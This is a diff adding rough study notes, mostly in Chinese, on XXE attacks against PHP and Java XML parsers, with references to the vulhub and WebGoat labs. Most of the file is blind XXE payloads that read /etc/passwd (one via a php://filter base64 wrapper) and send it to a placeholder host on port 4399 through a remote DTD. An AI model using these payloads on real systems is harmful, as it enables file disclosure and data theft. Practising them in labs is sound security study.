@@ -1,0 +1,18 @@
+php
+dtd文档是什么?
+&lg  &ng  xss得防护得html实体,,是否与dtd文档有关??understand??????==  为啥要导入外部Html得dtd/html标准 ,标准模式和混杂模式
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+
+<!ENTITY % file SYSTEM  "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM 'http://xxxxxxxxxxx:4399/?f=%file;'>">
+%eval;
+php 靶场vulhub
+#为啥是php伪协议,are you ok？我是不ok, simple——loadxxe，domxxe,  xmllib<1.6禁用外部实体..
+为啥java一番风顺
+java docker webgoat
+<!ENTITY % file SYSTEM  "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM 'http://xxxxxxxxx:4399/?f=%file;'>">
+%eval;
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]><comment>  <text>&eval;</text></comment>
